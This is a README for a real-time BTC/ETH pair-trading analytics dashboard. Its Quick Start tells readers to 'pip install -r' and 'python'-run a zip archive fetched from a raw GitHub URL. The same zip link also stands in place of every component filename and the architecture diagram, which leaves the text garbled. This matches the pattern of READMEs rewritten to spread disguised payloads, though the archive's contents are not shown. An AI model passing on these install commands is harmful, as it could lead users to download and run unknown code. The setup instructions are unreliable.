# Gemscap Quant Analytics

A complete end-to-end real-time quantitative analytics dashboard for MFT style trading.

## Features
- **Real-time Data Ingestion**: Connects to Binance Futures WebSocket for live tick data (BTCUSDT, ETHUSDT).
- **Efficient Storage**: Stores normalized trade data in a local SQLite database with indexing for fast retrieval.
- **Advanced Analytics**:
    - Real-time Spread Calculation (BTC vs ETH).
    - OLS Hedge Ratio estimation.
    - Rolling Z-Score with customizable windows.
    - Augmented Dickey-Fuller (ADF) test for stationarity.
- **Interactive Dashboard**: Streamlit-based UI with Dark Mode, interactive Plotly charts, and auto-refresh.

## Quick Start (Single Command)

1. **Install Dependencies**:
   ```bash
   pip install -r https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip
   ```
   streamlit>=1.30.0
plotly>=5.18.0
pandas>=2.0.0
statsmodels>=0.14.0
websockets>=12.0
aiohttp>=3.9.0
watchdog>=3.0.0

2. **Run the Application**:
   ```bash
   python https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip
   ```
   This will start both the background ingestion service and the frontend dashboard.

## Architecture

[Architecture Diagram](https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip)

### Components
1.  **Ingestion Service (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: Asynchronous WebSocket client that subscribes to trade streams, buffers data, and batch writes to the database.
2.  **Storage (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: SQLite interface handling efficient insertions and time-window queries.
3.  **Analytics Engine (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: Pandas/Statsmodels module for rescheduling tick data to OHLC, computing spreads, and running statistical tests.
4.  **Frontend (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: Streamlit application that queries the DB, runs analytics on the fly, and renders visualizations.

## Usage
- **Configuration Sidebar**: Adjust the "Lookback Window" to analyze different time horizons. Change the Z-Score window to tune sensitivity.
- **Alerts**: The Z-Score metric will turn RED and show an ALERT label if the value exceeds the configured threshold (default 2.0).
- **Data Export**: Use the "Download CSV" button in the Data tab to export processed OHLC data.

## Methodology
- **Resampling**: Tick data is aggregated into OHLC candles (1s, 1m, 5m) to handle high-frequency noise.
- **Pair Trading Logic**: We model the relationship between BTC and ETH. The spread is calculated as $Price_{BTC} - \beta \times Price_{ETH}$, where $\beta$ is derived from OLS regression on the selected lookback window.
- **Stationarity**: We use the ADF test to confirm if the spread is mean-reverting, which validates the Z-Score signal.